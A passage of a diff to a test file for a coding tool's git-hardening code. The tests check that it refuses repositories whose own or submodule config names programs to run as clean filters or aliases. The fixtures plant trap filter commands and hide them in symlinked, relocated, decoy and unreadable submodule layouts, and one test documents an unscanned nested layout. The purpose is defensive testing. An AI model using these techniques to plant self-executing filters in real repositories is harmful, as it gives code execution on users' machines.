@@ -22,7 +22,7 @@
  */
 import { describe, it, expect, beforeEach, afterEach } from 'vitest';
 import { execFileSync } from 'child_process';
-import { appendFileSync, chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, rmSync, writeFileSync } from 'fs';
+import { appendFileSync, chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, renameSync, rmSync, statSync, symlinkSync, writeFileSync } from 'fs';
 import { tmpdir } from 'os';
 import { join } from 'path';
 import {
@@ -39,6 +39,8 @@ import {
   switchBranch,
   autoCommitAgentChanges,
   SAFE_CONTENT_FILTER_COMMANDS,
+  isSafeContentFilterCommand,
+  MAX_SUBMODULE_CONFIGS,
 } from './git';
 import { resolveHooksDir, resolveHooksDirResult } from './gitHookInstaller';
 import { performCodeReview } from './codeReview';
@@ -488,6 +490,13 @@ describe.skipIf(!hasGit || !posix)('git calls inside a repository with a hostile
     mkdirSync(sub);
 
     expect(getGitDiff(false, sub).error).toMatch(/Refusing to run git/);
+    // And getGitStatus carries it on `refusal` here too, not only in its
+    // catch: this is the other of the two paths the TUI notice depends on,
+    // and it shipped filling `error` alone.
+    const status = getGitStatus(sub);
+    expect(status.isRepo).toBe(true);
+    expect(typeof status.refusal).toBe('string');
+    expect(status.refusal ?? '').toMatch(/Refusing to run git/);
   });
 
   it('surfaces a remote.<name>.uploadpack refusal on the status line instead of a blank branch', () => {
@@ -1255,6 +1264,26 @@ describe.skipIf(!hasGit || !posix)('a repository that configures its own content
     expect(keys.filter(k => /required/i.test(k ?? ''))).toEqual([]);
   });
 
+  it('carries the refusal on `refusal`, from a real repository, so the TUI notice can fire', () => {
+    // The notice in renderer/main.ts reads `status.refusal` and nothing else,
+    // deliberately: `error` is every way git can fail and the commonest of
+    // them is a brand-new repository. `GitStatus` did not declare `refusal`
+    // and getGitStatus never set it, so the warning shipped dead — a
+    // repository whose config names a program looked like an ordinary folder
+    // with no branch, which is the exact symptom that notice exists to
+    // remove. Asserted against a repository that really refuses rather than a
+    // mocked status object, because a mock would have passed the whole time.
+    const status = getGitStatus(crypt);
+
+    expect(status.isRepo).toBe(true);
+    expect(status.refusal).toContain('filter.crypt.clean');
+    expect(status.refusal).toContain('git config --unset filter.crypt.clean');
+    // `error` keeps the same text so callers that only know about it still
+    // say something useful.
+    expect(status.error).toBe(status.refusal);
+    expect(status.branch).toBeUndefined();
+  });
+
   it('reaches @git, the diff and the review path as a refusal, not as a crash', () => {
     // GitHardeningError has to arrive the same way through every entry point,
     // because the user meets it wherever they happen to be. A throw escaping
@@ -1399,6 +1428,64 @@ describe.skipIf(!hasGit || !posix)('a repository whose content filter is a known
     expect(() => hardenedGitEnv({ cwd: lfs })).toThrow(/filter\.lfs\.clean/);
   });
 
+  it('leaves the same integration alone when it is spelled with an absolute path', () => {
+    // What `git lfs install` writes on a machine where git-lfs is not the
+    // one on PATH — and, until this round, a repository Codeep refused every
+    // git call in. The shim IS the git-lfs on PATH here, which is the
+    // condition the relaxation turns on.
+    git(lfs, ['config', 'filter.lfs.clean', `${join(bin, 'git-lfs')} clean -- %f`]);
+    git(lfs, ['config', 'filter.lfs.smudge', `${join(bin, 'git-lfs')} smudge -- %f`]);
+
+    // Asserted rather than just called: the refusal is what this test is
+    // about, so it has to read as a failed expectation naming the value, not
+    // as the fixture falling over on an exception.
+    let env!: NodeJS.ProcessEnv;
+    expect(() => {
+      env = onPath();
+    }).not.toThrow();
+
+    const out = execFileSync('git', ['status', '--porcelain'], { cwd: lfs, env, encoding: 'utf-8' });
+    expect(out).toContain('blob.bin');
+    // The filter really ran: the call was not merely allowed through with the
+    // driver emptied out from under it.
+    expect(fired()).toEqual(['git-lfs']);
+  });
+
+  it('refuses an absolute path the repository planted in its own checkout', () => {
+    // The same spelling, pointed at a program the REPOSITORY ships. Nothing
+    // about it is git-lfs except the filename, and that is exactly what a
+    // basename comparison on its own would have accepted.
+    const theirs = join(lfs, 'tools');
+    mkdirSync(theirs);
+    writeFileSync(join(theirs, 'git-lfs'), `#!/bin/sh\n${trap('planted')}\ncat\n`);
+    chmodSync(join(theirs, 'git-lfs'), 0o755);
+    git(lfs, ['config', 'filter.lfs.clean', `${join(theirs, 'git-lfs')} clean -- %f`]);
+
+    expect(() => onPath()).toThrow(/filter\.lfs\.clean/);
+    expect(fired()).toEqual([]);
+  });
+
+  it("leaves git-annex's own two lines alone, which its repositories cannot work without", () => {
+    // `git annex init` writes these into the repository's own config and
+    // routes every annexed path at the driver, so a refusal here is a refusal
+    // of the whole checkout — the same shape the git-lfs lines were already
+    // on the list for.
+    writeFileSync(join(bin, 'git-annex'), `#!/bin/sh\n${trap('git-annex')}\ncat\n`);
+    chmodSync(join(bin, 'git-annex'), 0o755);
+    writeFileSync(join(lfs, '.gitattributes'), '*.bin filter=annex\n');
+    git(lfs, ['config', 'filter.annex.clean', 'git-annex clean -- %f']);
+    git(lfs, ['config', 'filter.annex.smudge', 'git-annex smudge -- %f']);
+
+    let env!: NodeJS.ProcessEnv;
+    expect(() => {
+      env = onPath();
+    }).not.toThrow();
+
+    const out = execFileSync('git', ['status', '--porcelain'], { cwd: lfs, env, encoding: 'utf-8' });
+    expect(out).toContain('blob.bin');
+    expect(fired()).toEqual(['git-annex']);
+  });
+
   it('every allowlisted command is a plain command line with no shell metacharacter', () => {
     // The allowlist's safety rests on its entries being literals with nothing
     // in them a shell would act on, so that "exact match" and "harmless" mean
@@ -1518,7 +1605,61 @@ describe.skipIf(!hasGit || !posix)('a submodule that carries its own git config'
 
     expect(fired()).toEqual([]);
     expect(stderr).toContain("refusing to run 'git sub'");
-    expect(stderr).toContain('git config --unset alias.sub');
+    // Names the SUBMODULE and prints a command that reaches it. A plain
+    // `git config --unset alias.sub` run at the superproject clears nothing
+    // — `--unset` writes the repository it runs in, and the alias is in
+    // `.git/modules/vendor/lib/config`, which the superproject's own config
+    // never mentions. The user ran it, saw no error and met the same refusal.
+    expect(stderr).toContain(submodule);
+    expect(stderr).toContain(`git -C ${submodule} config --unset alias.sub`);
+    expect(stderr).not.toContain('an alias this repository defined');
+
+    // And the printed command is the one that works: run it, and the alias
+    // is gone from the file the refusal came out of.
+    execFileSync('git', ['-C', submodule, 'config', '--unset', 'alias.sub'], { stdio: 'ignore' });
+    expect(readFileSync(join(superRepo, '.git', 'modules', 'vendor', 'lib', 'config'), 'utf-8'))
+      .not.toContain('alias');
+  });
+
+  it('names the submodule in the refusal and prints an unset that actually clears it', () => {
+    // The refusal used to name the SUPERPROJECT and print `git config
+    // --unset filter.deep.clean`. Run there, that clears nothing: `--unset`
+    // writes the repository it is run in, and the key lives in
+    // `.git/modules/vendor/lib/config`, which the superproject's own config
+    // never mentions. So the one instruction the user was given was a no-op,
+    // and the next call refused identically.
+    writeFileSync(join(submodule, '.gitattributes'), '*.bin filter=deep\n');
+    git(submodule, ['add', '-A']);
+    git(submodule, ['config', 'filter.deep.clean', `${trap('sub-clean')}; cat`]);
+
+    const before = getGitStatus(superRepo);
+
+    expect(before.refusal).toContain('filter.deep.clean');
+    // Which repository it is, in words and as a path.
+    expect(before.refusal).toContain('submodule');
+    expect(before.refusal).toContain(submodule);
+    expect(before.refusal).not.toContain("this repository's own git config");
+    expect(before.refusal).toContain(`git -C ${submodule} config --unset filter.deep.clean`);
+
+    // The old instruction, run exactly as it was printed: git exits 5 with
+    // nothing on stderr — "no such section" — so the user is told nothing,
+    // and the refusal is unchanged.
+    let status = 0;
+    try {
+      execFileSync('git', ['-C', superRepo, 'config', '--unset', 'filter.deep.clean'], { stdio: 'ignore' });
+    } catch (error) {
+      status = (error as { status?: number }).status ?? 0;
+    }
+    expect(status).toBe(5);
+    expect(getGitStatus(superRepo).refusal).toContain('filter.deep.clean');
+
+    // The new one, run exactly as it is printed.
+    git(submodule, ['config', '--unset', 'filter.deep.clean']);
+    const after = getGitStatus(superRepo);
+
+    expect(after.refusal).toBeUndefined();
+    expect(after.branch).toBeTruthy();
+    expect(fired()).toEqual([]);
   });
 
   it('leaves a known-safe submodule filter alone, as it would at the superproject', () => {
@@ -1534,36 +1675,1026 @@ describe.skipIf(!hasGit || !posix)('a submodule that carries its own git config'
   });
 
   it('refuses rather than scan only some of a superproject with too many submodules', () => {
-    // The cap is a bound on a directory tree the REPOSITORY owns, so the
-    // answer past it has to be "no" rather than "we checked 512 of them" —
-    // the partial scan is a fail-open dressed as a limit. The directories are
-    // made by hand because what the walk looks for is a `config` file, not a
-    // working submodule, and 513 real `git submodule add` calls would take
-    // minutes to prove the same branch.
-    const modules = join(superRepo, '.git', 'modules', 'many');
-    for (let i = 0; i < 513; i++) {
+    // The cap is a bound on a tree the REPOSITORY owns, so the answer past it
+    // has to be "no" rather than "we checked some of them" — the partial scan
+    // is a fail-open dressed as a limit. The submodules are declared by hand,
+    // because what the enumeration reads is `submodule.<name>.url` plus the
+    // git dir the name maps to, and 2049 real `git submodule add` calls would
+    // take minutes to prove the same branch.
+    const modules = join(superRepo, '.git', 'modules');
+    let declared = '';
+    for (let i = 0; i < MAX_SUBMODULE_CONFIGS + 1; i++) {
       mkdirSync(join(modules, `m${i}`), { recursive: true });
       writeFileSync(join(modules, `m${i}`, 'config'), '[core]\n\trepositoryformatversion = 0\n');
+      declared += `[submodule "m${i}"]\n\turl = ../lib\n\tactive = true\n`;
     }
+    appendFileSync(join(superRepo, '.git', 'config'), declared);
 
-    expect(() => hardenedGitEnv({ cwd: superRepo })).toThrow(/more than 512 initialised submodules/);
+    // The message has to name something the user can change. The cap used to
+    // be 512 with a sentence that offered nothing at all, so a superproject
+    // past it was simply refused forever.
+    expect(() => hardenedGitEnv({ cwd: superRepo }))
+      .toThrow(new RegExp(`more than ${MAX_SUBMODULE_CONFIGS} initialised submodules`));
+    expect(() => hardenedGitEnv({ cwd: superRepo })).toThrow(/git submodule deinit/);
+    expect(() => hardenedGitEnv({ cwd: superRepo })).toThrow(/git -C <path>/);
   });
 
-  it('adds no git child process to a repository that has no submodules', () => {
-    // The cost guard. `.git/modules` is absent in every repository anyone
-    // here has, and the pass must notice that without asking git — otherwise
-    // every hardened call pays for a feature almost nobody uses. `git config
-    // --list` is the one child hardenedGitEnv is allowed.
+  it('is a cap far past any real superproject, so it is a backstop and not a wall', () => {
+    // The other half of raising it: the number has to be one nobody reaches
+    // by having a lot of submodules. The largest superprojects published
+    // anywhere are in the low hundreds.
+    expect(MAX_SUBMODULE_CONFIGS).toBeGreaterThanOrEqual(2048);
+  });
+
+  /**
+   * Count the git children one hardenedGitEnv() call spawns, by putting a
+   * shim named `git` in front of the real one on the PATH it hands them.
+   *
+   * This replaces a wall-clock budget, which was a bad guard twice over: it
+   * could not say WHICH property broke, and the number it allowed (60ms for
+   * one ~7ms child) was wide enough for a second process to hide in. The
+   * shim answers the actual question — how many, and which subcommands.
+   */
+  function gitChildrenOf(cwd: string): string[] {
+    const shimDir = join(base, `shim-${Math.random().toString(36).slice(2)}`);
+    const log = join(shimDir, 'calls.log');
+    mkdirSync(shimDir);
+    const realGit = execFileSync('sh', ['-c', 'command -v git'], { encoding: 'utf-8' }).trim();
+    writeFileSync(join(shimDir, 'git'), `#!/bin/sh\nprintf '%s\\n' "$*" >> "${log}"\nexec ${realGit} "$@"\n`);
+    chmodSync(join(shimDir, 'git'), 0o755);
+    writeFileSync(log, '');
+
+    hardenedGitEnv({ cwd, base: { ...process.env, PATH: `${shimDir}:${process.env.PATH ?? ''}` } });
+
+    // The subcommand as a whole word, so the `-c include.path=…/config`
+    // arguments of the submodule read are not mistaken for one.
+    return readFileSync(log, 'utf-8')
+      .split('\n')
+      .filter(Boolean)
+      .map(line => ['ls-files', 'config', 'rev-parse'].find(cmd => new RegExp(`(^| )${cmd}( |$)`).test(line)) ?? line);
+  }
+
+  it('reads the index even in a repository that declares no submodules', () => {
+    // The cost guard, and it changed sides this round. There used to be a
+    // gate that skipped the index listing when nothing DECLARED a submodule —
+    // no `submodule.*` config, no `.git/modules`, no `.gitmodules` — and a
+    // gitlink added with a plain `git add` leaves none of the three while git
+    // still descends into it. So the listing runs here too, and what the
+    // guard pins now is the price: exactly two children, never one per
+    // anything. Measured, that is 7.0ms → 13.6ms at this repository's size.
     const plain = join(base, 'lib');
     expect(existsSync(join(plain, '.git', 'modules'))).toBe(false);
+    expect(existsSync(join(plain, '.gitmodules'))).toBe(false);
 
-    const before = Date.now();
-    for (let i = 0; i < 5; i++) hardenedGitEnv({ cwd: plain });
-    const perCall = (Date.now() - before) / 5;
+    expect(gitChildrenOf(plain).sort()).toEqual(['config', 'ls-files']);
+  });
 
-    // Deliberately loose — this is a "did a second process sneak in" guard,
-    // not a benchmark. One `git config --list` is ~6ms here; two would not
-    // fit in this budget on a loaded machine either.
-    expect(perCall).toBeLessThan(60);
+  it('stays at one `git config --list` for ALL the submodules, however many there are', () => {
+    // The property that makes this affordable: the configs are read through
+    // one `-c include.path=…` child whatever the count, so the cost is flat.
+    // A child per submodule measured 342ms on a fifty-submodule fixture — on
+    // every status refresh. The `ls-files` beside it is the index listing
+    // that finds the submodules, and it is also one, not one per submodule.
+    expect(gitChildrenOf(superRepo).sort()).toEqual(['config', 'config', 'ls-files']);
+
+    // Nine more submodules, sharing the one library, and the same two reads.
+    for (let i = 0; i < 9; i++) {
+      git(superRepo, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../lib', `vendor/extra${i}`]);
+    }
+
+    expect(gitChildrenOf(superRepo).sort()).toEqual(['config', 'config', 'ls-files']);
+  });
+});
+
+/**
+ * The submodule layouts the old `.git/modules` directory walk did not see.
+ *
+ * The walk was the wrong primitive: it asked the filesystem what looked like
+ * a submodule git directory instead of asking git which submodules there
+ * are. Three real layouts escaped it, and each one is reproduced below by
+ * first running a plain `git status` at the SUPERPROJECT and watching the
+ * submodule's clean filter fire — the repository is ordinary, the config is
+ * the submodule's own, and the superproject's `.git/config` is spotless.
+ *
+ * The fourth, a symlinked `.git/modules/<name>`, was skipped rather than
+ * missed: `isDirectory()` is false for a symlink, so the walk stepped over
+ * a git directory git follows without blinking.
+ */
+describe.skipIf(!hasGit || !posix)('submodule layouts the .git/modules walk missed', () => {
+  isolateGitConfig();
+  let lib: string;
+
+  beforeEach(() => {
+    base = realpathSync(mkdtempSync(join(tmpdir(), 'codeep-git-submodule-shapes-')));
+    markers = join(base, 'markers');
+    mkdirSync(markers);
+
+    lib = join(base, 'lib');
+    git(base, ['init', '-q', 'lib']);
+    git(lib, ['config', 'user.email', 'test@test.com']);
+    git(lib, ['config', 'user.name', 'Test User']);
+    writeFileSync(join(lib, '.gitattributes'), '*.bin filter=deep\n');
+    writeFileSync(join(lib, 'notes.bin'), 'before\n');
+    git(lib, ['add', '-A']);
+    git(lib, ['commit', '-qm', 'initial']);
+  });
+
+  afterEach(() => {
+    rmSync(base, { recursive: true, force: true });
+  });
+
+  /** An empty superproject, ready for a submodule in whichever shape. */
+  function makeSuper(): string {
+    const superRepo = join(base, 'super');
+    git(base, ['init', '-q', 'super']);
+    git(superRepo, ['config', 'user.email', 'test@test.com']);
+    git(superRepo, ['config', 'user.name', 'Test User']);
+    return superRepo;
+  }
+
+  /**
+   * Arm the submodule's own clean filter, make the tracked file dirty, and
+   * assert that a PLAIN `git status` at the superproject runs it.
+   *
+   * Every test here needs that assertion, because "the marker stayed cold"
+   * is only worth something once the marker is known to be reachable: a
+   * layout the fix does not scan but git never descends into would pass a
+   * one-sided test while proving nothing.
+   */
+  function armAndProveReachable(superRepo: string, submodule: string): void {
+    git(submodule, ['config', 'filter.deep.clean', `${trap('sub-clean')}; cat`]);
+    // Same length as the original, so git cannot skip the content comparison
+    // that runs the clean filter.
+    writeFileSync(join(submodule, 'notes.bin'), 'after.\n');
+
+    git(superRepo, ['status', '--porcelain']);
+    expect(fired()).toEqual(['sub-clean']);
+    rmSync(join(markers, 'sub-clean'));
+  }
+
+  it('reads the config of a submodule whose git directory is embedded in the working tree', () => {
+    // `git submodule add` over a path that is ALREADY a checkout answers
+    // "Adding existing repo at '<path>' to the index" and leaves the embedded
+    // `.git` directory where it is — so `.git/modules` is never created and
+    // the walk had nothing to walk. A hand-over of a prepared directory tree
+    // is all it takes to arrive in this shape.
+    const superRepo = makeSuper();
+    git(superRepo, ['clone', '-q', lib, 'vendor/lib']);
+    git(superRepo, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../lib', 'vendor/lib']);
+    git(superRepo, ['commit', '-qm', 'add submodule']);
+    const submodule = join(superRepo, 'vendor', 'lib');
+    expect(existsSync(join(superRepo, '.git', 'modules'))).toBe(false);
+    expect(statSync(join(submodule, '.git')).isDirectory()).toBe(true);
+
+    armAndProveReachable(superRepo, submodule);
+    const status = getGitStatus(superRepo);
+
+    expect(fired()).toEqual([]);
+    expect(status.refusal).toContain('filter.deep.clean');
+    expect(status.branch).toBeUndefined();
+  });
+
+  it('does NOT reach the same shape one level down, which is the gap this pins', () => {
+    // The shape git.ts names under "WHAT IS STILL NOT REACHED": a submodule
+    // OF a submodule whose git directory is embedded in its parent's working
+    // tree. The enumeration finds `vendor/mid` from the superproject's index
+    // and reads its config, but the only thing that config gives for `deep`
+    // is a NAME, which maps to `<mid's git dir>/modules/deep` — and this
+    // checkout's `deep` keeps its git directory in mid's working tree
+    // instead. Reaching it means reading mid's own index, which is one more
+    // child process per submodule, and that is a trade for a release rather
+    // than for a hotfix.
+    //
+    // So this test does not assert the fix; it asserts the GAP, with a live
+    // control that the gap is real and reachable. If a later round widens the
+    // scan, this test goes red and says so, which is the point of pinning it.
+    const superRepo = makeSuper();
+    const mid = join(base, 'mid');
+    git(base, ['init', '-q', 'mid']);
+    git(mid, ['config', 'user.email', 'test@test.com']);
+    git(mid, ['config', 'user.name', 'Test User']);
+    writeFileSync(join(mid, 'mid.txt'), 'x\n');
+    git(mid, ['add', '-A']);
+    git(mid, ['commit', '-qm', 'initial']);
+    git(mid, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../lib', 'deep']);
+    git(mid, ['commit', '-qm', 'add deep']);
+
+    git(superRepo, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../mid', 'vendor/mid']);
+    git(superRepo, ['commit', '-qm', 'add mid']);
+
+    // `git submodule add` does not initialise a submodule's own submodules,
+    // so `deep` arrives as an empty directory. Filling it with a clone is how
+    // a hand-prepared tree arrives — and it is the embedded shape, a real
+    // `.git` DIRECTORY sitting inside mid's working tree.
+    const deep = join(superRepo, 'vendor', 'mid', 'deep');
+    rmSync(deep, { recursive: true, force: true });
+    git(base, ['clone', '-q', lib, deep]);
+    expect(statSync(join(deep, '.git')).isDirectory()).toBe(true);
+
+    // The control: git really does descend two levels and really does run
+    // the innermost checkout's clean filter on the SUPERPROJECT's own
+    // `git status --porcelain`.
+    armAndProveReachable(superRepo, deep);
+
+    const status = getGitStatus(superRepo);
+
+    // Current behaviour, stated out loud: the call goes through, and the
+    // filter git would have run is one Codeep never saw.
+    expect(status.refusal).toBeUndefined();
+    expect(status.branch).toBeTruthy();
+    // The one level up IS covered, so the gap is the depth and not the shape.
+    git(join(superRepo, 'vendor', 'mid'), ['config', 'filter.deep.clean', `${trap('mid-clean')}; cat`]);
+    expect(getGitStatus(superRepo).refusal).toContain('filter.deep.clean');
+  });
+
+  it('reads the config of a submodule whose .git file points outside .git/modules', () => {
+    // Absorbed submodules point at `.git/modules/<name>`, and nothing makes
+    // them: a `.git` file is one line of text, and git follows wherever it
+    // points. The walk only ever looked under `.git/modules`.
+    const superRepo = makeSuper();
+    git(superRepo, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../lib', 'vendor/lib']);
+    git(superRepo, ['commit', '-qm', 'add submodule']);
+    const submodule = join(superRepo, 'vendor', 'lib');
+    const moved = join(superRepo, '.git', 'elsewhere');
+    renameSync(join(superRepo, '.git', 'modules', 'vendor', 'lib'), moved);
+    writeFileSync(join(submodule, '.git'), 'gitdir: ../../.git/elsewhere\n');
+    appendFileSync(join(moved, 'config'), `[core]\n\tworktree = ${submodule}\n`);
+
+    armAndProveReachable(superRepo, submodule);
+    const status = getGitStatus(superRepo);
+
+    expect(fired()).toEqual([]);
+    expect(status.refusal).toContain('filter.deep.clean');
+  });
+
+  it('is not fooled by a decoy config planted above a slashed submodule name', () => {
+    // One `touch` is the whole attack. A submodule named `vendor/lib` lands
+    // at `.git/modules/vendor/lib/config`, and the walk descended through
+    // `.git/modules/vendor` only while that directory had no `config` of its
+    // own — so an empty file there made it stop, report the decoy and never
+    // reach the real one. A name is a direct lookup, so nothing planted
+    // alongside it hides it.
+    const superRepo = makeSuper();
+    git(superRepo, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../lib', 'vendor/lib']);
+    git(superRepo, ['commit', '-qm', 'add submodule']);
+    const submodule = join(superRepo, 'vendor', 'lib');
+    writeFileSync(join(superRepo, '.git', 'modules', 'vendor', 'config'), '[core]\n\trepositoryformatversion = 0\n');
+
+    armAndProveReachable(superRepo, submodule);
+    const status = getGitStatus(superRepo);
+
+    expect(fired()).toEqual([]);
+    expect(status.refusal).toContain('filter.deep.clean');
+  });
+
+  it('follows a symlinked .git/modules entry instead of stepping over it', () => {
+    // `Dirent.isDirectory()` is false for a symlink, so the walk skipped one
+    // — and skipping is the one answer a symlinked git directory must not
+    // get, because git follows it. Reading through it is what git does, so
+    // that is what this does; refusing would break a checkout somebody moved
+    // onto another disk for perfectly ordinary reasons.
+    const superRepo = makeSuper();
+    git(superRepo, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../lib', 'vendor/lib']);
+    git(superRepo, ['commit', '-qm', 'add submodule']);
+    const submodule = join(superRepo, 'vendor', 'lib');
+    const inside = join(superRepo, '.git', 'modules', 'vendor', 'lib');
+    const outside = join(base, 'moved-git-dir');
+    renameSync(inside, outside);
+    symlinkSync(outside, inside);
+    appendFileSync(join(outside, 'config'), `[core]\n\tworktree = ${submodule}\n`);
+
+    armAndProveReachable(superRepo, submodule);
+    const status = getGitStatus(superRepo);
+
+    expect(fired()).toEqual([]);
+    expect(status.refusal).toContain('filter.deep.clean');
+  });
+
+  it('reads a gitlink that no .gitmodules and no submodule.* config declares', () => {
+    // The gate in front of the index enumeration: it ran `git ls-files` only
+    // when the config named a submodule, or `.git/modules` existed, or the
+    // working tree had a `.gitmodules`. A gitlink added with a plain `git
+    // add` leaves NONE of those three, so the enumeration the whole pass was
+    // rebuilt around never ran and the submodule went unscanned — while git
+    // descended into it all the same. One `git clone` and one `git add` is
+    // the entire setup.
+    const superRepo = makeSuper();
+    git(superRepo, ['clone', '-q', lib, 'vendor/lib']);
+    git(superRepo, ['add', 'vendor/lib']);
+    git(superRepo, ['commit', '-qm', 'gitlink with nothing declaring it']);
+    const submodule = join(superRepo, 'vendor', 'lib');
+    // The three signals the gate looked for, all absent.
+    expect(existsSync(join(superRepo, '.gitmodules'))).toBe(false);
+    expect(existsSync(join(superRepo, '.git', 'modules'))).toBe(false);
+    expect(git(superRepo, ['config', '--list', '--local'])).not.toMatch(/^submodule\./m);
+
+    armAndProveReachable(superRepo, submodule);
+    const status = getGitStatus(superRepo);
+
+    expect(fired()).toEqual([]);
+    expect(status.refusal).toContain('filter.deep.clean');
+    expect(status.branch).toBeUndefined();
+  });
+
+  it('says nothing about submodules in a repository git will not serve at all', () => {
+    // The index listing now runs everywhere, which means it also runs in the
+    // repositories git refuses to touch. `core.repositoryformatversion = 99`
+    // is the sharp one: `git config --list` only WARNS there and still exits
+    // 0, so the scan gets as far as the index and then meets a git that will
+    // not read one. Turning that into a hardening refusal would be wrong
+    // twice — the real call cannot run there either, so there is nothing to
+    // refuse over, and the refusal would talk about a submodule scan in a
+    // repository that has no submodules and no working git.
+    const superRepo = makeSuper();
+    git(superRepo, ['config', 'core.repositoryformatversion', '99']);
+
+    expect(() => hardenedGitEnv({ cwd: superRepo })).not.toThrow();
+    // Not vacuous: git really does decline every command in there, which is
+    // the whole reason there is nothing left to protect.
+    expect(() => git(superRepo, ['status', '--porcelain'])).toThrow();
+  });
+
+  it("reads a submodule's config.worktree, which git honours as its own scope", () => {
+    // `<gitdir>/config.worktree` ships inside the git directory exactly as
+    // `config` does, and git reads it as scope `worktree` once the repository
+    // sets `extensions.worktreeConfig`. The pass read only `config`, so a
+    // `filter.<d>.clean` written with `git config --worktree` inside a
+    // submodule survived the entire scan while the superproject's own plain
+    // `git status` ran it (reproduced, git 2.54).
+    const superRepo = makeSuper();
+    git(superRepo, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../lib', 'vendor/lib']);
+    git(superRepo, ['commit', '-qm', 'add submodule']);
+    const submodule = join(superRepo, 'vendor', 'lib');
+    git(submodule, ['config', 'extensions.worktreeConfig', 'true']);
+    git(submodule, ['config', '--worktree', 'filter.deep.clean', `${trap('sub-clean')}; cat`]);
+    // The key really is in the other file, so this cannot pass by accident.
+    const gitDir = join(superRepo, '.git', 'modules', 'vendor', 'lib');
+    expect(readFileSync(join(gitDir, 'config.worktree'), 'utf-8')).toContain('clean');
+    expect(readFileSync(join(gitDir, 'config'), 'utf-8')).not.toContain('clean');
+    writeFileSync(join(submodule, 'notes.bin'), 'after.\n');
+    git(superRepo, ['status', '--porcelain']);
+    expect(fired()).toEqual(['sub-clean']);
+    rmSync(join(markers, 'sub-clean'));
+
+    const status = getGitStatus(superRepo);
+
+    expect(fired()).toEqual([]);
+    expect(status.refusal).toContain('filter.deep.clean');
+    // And the `--unset` it prints reaches the file the key is actually in: a
+    // plain `git config --unset` writes the LOCAL config, exits 5 and clears
+    // nothing here (verified, git 2.54).
+    expect(status.refusal).toContain(`git -C ${submodule} config --worktree --unset filter.deep.clean`);
+  });
+
+  it('refuses instead of treating an unreadable submodule git dir as "no submodule here"', () => {
+    // The bounds have to fail CLOSED like the count cap does. This one used
+    // to be an `existsSync`, which answers false for a file it has no
+    // permission to look at — so one `chmod 000` turned a submodule carrying
+    // a hostile filter into a repository with no submodules at all, in
+    // silence, while git read the same file without trouble.
+    const superRepo = makeSuper();
+    git(superRepo, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../lib', 'vendor/lib']);
+    git(superRepo, ['commit', '-qm', 'add submodule']);
+    const gitDir = join(superRepo, '.git', 'modules', 'vendor', 'lib');
+    chmodSync(gitDir, 0o000);
+
+    try {
+      expect(() => hardenedGitEnv({ cwd: superRepo })).toThrow(/could not be reached/);
+    } finally {
+      chmodSync(gitDir, 0o755);
+    }
+  });
+
+  it('refuses instead of scanning only the levels it reached of a deeply nested tree', () => {
+    // The depth guard used to `return`, which made "nested one level too
+    // deep" mean "no more submodules down there" — the same fail-open the
+    // count cap was written to avoid, sitting right next to it. The levels
+    // are declared by hand: what the enumeration follows is
+    // `submodule.<name>.url` plus the `modules/<name>` each name maps to,
+    // and seventeen real `git submodule add` calls prove the same branch far
+    // more slowly.
+    const superRepo = makeSuper();
+    let dir = join(superRepo, '.git');
+    appendFileSync(join(dir, 'config'), '[submodule "n0"]\n\turl = ../lib\n\tactive = true\n');
+    for (let level = 0; level < 18; level++) {
+      dir = join(dir, 'modules', `n${level}`);
+      mkdirSync(dir, { recursive: true });
+      writeFileSync(
+        join(dir, 'config'),
+        `[core]\n\trepositoryformatversion = 0\n[submodule "n${level + 1}"]\n\turl = ../lib\n\tactive = true\n`
+      );
+    }
+
+    expect(() => hardenedGitEnv({ cwd: superRepo })).toThrow(/nested more than 16 levels deep/);
+  });
+});
+
+/**
+ * A content filter that routes nothing in this checkout today.
+ *
+ * The previous round relaxed the filter rule so that it refused only when
+ * some attributes file said `filter=<driver>`, to spare the ordinary
+ * repository still carrying a leftover `filter.nbstripout.*`. That answer
+ * needed a second copy of git's attribute resolution to be right, and it was
+ * not: `.git/info/attributes` in a linked worktree, `attr.tree`,
+ * `--attr-source` and a path that is in the index but not on disk all route
+ * paths the copy never looked at, and every one of them reads back as "inert"
+ * — which hands the repository arbitrary execution.
+ *
+ * So the relaxation is reverted, and these tests pin the revert: the refusal
+ * is flat again. The one thing the message owes the leftover-config user is a
+ * sentence explaining why a driver they can see nothing using still stops the
+ * call, and the last test here asserts it is there.
+ */
+describe.skipIf(!hasGit || !posix)('a content filter with nothing routed at it today', () => {
+  isolateGitConfig();
+  let repoDir: string;
+
+  beforeEach(() => {
+    base = realpathSync(mkdtempSync(join(tmpdir(), 'codeep-git-unrouted-filter-')));
+    markers = join(base, 'markers');
+    repoDir = join(base, 'repo');
+    mkdirSync(markers);
+
+    git(base, ['init', '-q', 'repo']);
+    git(repoDir, ['config', 'user.email', 'test@test.com']);
+    git(repoDir, ['config', 'user.name', 'Test User']);
+    writeFileSync(join(repoDir, 'README.md'), 'no notebooks here\n');
+    git(repoDir, ['add', '-A']);
+    git(repoDir, ['commit', '-qm', 'initial']);
+    // What `nbstripout --install` leaves behind, in the spelling that is NOT
+    // on the allowlist (the installer writes an absolute interpreter path on
+    // a modern install, and an absolute path is the machine's rather than a
+    // string this repository can pin). No `.gitattributes` anywhere names it.
+    git(repoDir, ['config', 'filter.nbstripout.clean', `${trap('nbstripout')}; cat`]);
+    writeFileSync(join(repoDir, 'notes.txt'), 'changed\n');
+  });
+
+  afterEach(() => {
+    rmSync(base, { recursive: true, force: true });
+  });
+
+  it('refuses although no .gitattributes routes a path at the driver', () => {
+    const status = getGitStatus(repoDir);
+
+    expect(status.refusal).toContain('filter.nbstripout.clean');
+    expect(status.error).toBe(status.refusal);
+    expect(fired()).toEqual([]);
+  });
+
+  it('refuses the calls the user actually makes, not only the status line', () => {
+    expect(stageAllResult(repoDir).error).toContain('filter.nbstripout.clean');
+    expect(getChangedFilesResult(repoDir).error).toContain('filter.nbstripout.clean');
